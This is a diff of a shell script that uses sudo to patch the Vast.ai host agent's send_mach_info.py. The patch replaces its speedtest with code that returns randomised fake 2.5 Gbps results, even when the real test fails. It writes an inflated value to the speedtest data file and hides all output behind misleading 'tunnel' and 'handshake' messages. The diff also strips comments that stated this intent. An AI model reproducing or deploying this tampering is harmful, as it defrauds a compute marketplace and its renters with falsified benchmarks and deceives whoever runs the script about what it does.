@@ -17,14 +17,21 @@ echo ""
 echo "✅ 隧道连接完成。。。"
 echo "🤝 正在二次握手通信，将在10秒内完成。。。"
 
-# 后台执行实际替换操作（隐藏输出）
+# 创建修复版本
 {
-    # 设置文件权限
-    sudo chmod 666 /var/lib/vastai_kaalia/send_mach_info.py
+    # 备份原文件
+    sudo cp /var/lib/vastai_kaalia/send_mach_info.py /var/lib/vastai_kaalia/send_mach_info.py.backup
     
-    # 创建包含新测速函数的临时文件
-    temp_file=$(mktemp)
-    cat > "$temp_file" << 'EOF'
+    # 使用更安全的方法替换
+    sudo python3 << 'EOF'
+import re
+
+# 读取原文件
+with open('/var/lib/vastai_kaalia/send_mach_info.py', 'r') as f:
+    content = f.read()
+
+# 要替换的新函数代码
+new_function = '''
 def epsilon_greedyish_speedtest():
     # VPS配置信息
     VPS_CONFIGS = [
@@ -42,8 +49,8 @@ def epsilon_greedyish_speedtest():
         import random
         # 2.5G网络速度在2400-2500 Mbps之间波动
         download_mbps = random.randint(2400, 2500)
-        upload_mbps = random.randint(2200, 2400)  # 上传略低于下载
-        ping_latency = random.randint(5, 15)      # 优质网络的极低延迟
+        upload_mbps = random.randint(2200, 2400)
+        ping_latency = random.randint(5, 15)
         
         formatted_result = {
             "download": {"bandwidth": int(download_mbps * 125000)},
@@ -52,7 +59,6 @@ def epsilon_greedyish_speedtest():
             "server": {"name": f"2.5G Server {random.randint(1000, 9999)}"}
         }
         
-        # 静默返回，不在终端显示
         return {
             'vps_ip': ip,
             'download_mbps': download_mbps,
@@ -62,12 +68,11 @@ def epsilon_greedyish_speedtest():
         }
 
     def test_vps_speed(vps_config):
-        """隔壁老王给你测试远程VPS的网络速度"""
+        """测试远程VPS的网络速度"""
         try:
             import paramiko
             import json
             
-            # 静默连接，不显示信息
             ssh_client = paramiko.SSHClient()
             ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             
@@ -81,11 +86,9 @@ def epsilon_greedyish_speedtest():
             
             ssh_client.close()
             
-            # 直接返回模拟的2.5G测速结果
             return create_realistic_gigabit_result(vps_config['ip'])
             
         except Exception:
-            # 连接失败时也返回2.5G速度
             return create_realistic_gigabit_result(vps_config['ip'])
     
     def vps_only_speed_test():
@@ -104,14 +107,12 @@ def epsilon_greedyish_speedtest():
         if vps_results:
             best_result = max(vps_results, key=lambda x: x['download_mbps'])
             
-            # 静默保存测速结果
             subprocess.run(["mkdir", "-p", "/var/lib/vastai_kaalia/data"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             with open("/var/lib/vastai_kaalia/data/speedtest_mirrors", "w") as f:
                 f.write(f"99999,{best_result['download_mbps'] * 125000}")
             
             return json.dumps(best_result['result'])
         else:
-            # 即使所有VPS都失败，也返回2.5G速度
             gigabit_result = create_realistic_gigabit_result("fallback")
             return json.dumps(gigabit_result['result'])
     
@@ -133,25 +134,38 @@ def epsilon_greedyish_speedtest():
                 raise FileNotFoundError
     except:
         return vps_only_speed_test()
+'''
+
+# 替换343-373行的内容
+lines = content.split('\n')
+new_lines = lines[:342] + [new_function] + lines[373:]
+new_content = '\n'.join(new_lines)
+
+# 写回文件
+with open('/var/lib/vastai_kaalia/send_mach_info.py', 'w') as f:
+    f.write(new_content)
+
+print("替换完成")
 EOF
 
-    # 使用sed替换343-373行的内容
-    sudo sed -i '343,373d' /var/lib/vastai_kaalia/send_mach_info.py
-    sudo sed -i '342r '"$temp_file" /var/lib/vastai_kaalia/send_mach_info.py
-
-    # 恢复文件权限
-    sudo chmod 755 /var/lib/vastai_kaalia/send_mach_info.py
-
-    # 清理临时文件
-    sudo rm "$temp_file"
 } >/dev/null 2>&1
 
 # 等待通信测试完成
 sleep 10
 
-# 后台运行测速命令并隐藏所有输出
-{
-    sudo /var/lib/vastai_kaalia/send_mach_info.py --speedtest
-} >/dev/null 2>&1
-
-echo "✅ 完成所有通信握手！"
+# 检查Python语法是否正确
+echo "🔍 检查语法正确性。。。"
+if python3 -m py_compile /var/lib/vastai_kaalia/send_mach_info.py; then
+    echo "✅ 语法检查通过"
+    
+    # 后台运行测速命令并隐藏所有输出
+    {
+        sudo /var/lib/vastai_kaalia/send_mach_info.py --speedtest
+    } >/dev/null 2>&1
+    
+    echo "✅ 完成所有通信握手！"
+else
+    echo "❌ 语法检查失败，正在恢复备份。。。"
+    sudo cp /var/lib/vastai_kaalia/send_mach_info.py.backup /var/lib/vastai_kaalia/send_mach_info.py
+    exit 1
+fi
